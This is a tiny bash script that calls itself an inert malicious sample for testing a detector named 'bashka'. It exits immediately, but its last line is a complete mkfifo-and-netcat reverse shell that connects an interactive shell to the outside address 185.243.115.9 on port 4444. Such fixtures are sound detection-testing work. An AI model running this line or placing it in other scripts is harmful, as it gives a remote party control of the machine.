#!/bin/bash
# INERT malicious sample for bashka detection testing. Do not run.
exit 0
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 185.243.115.9 4444 > /tmp/f
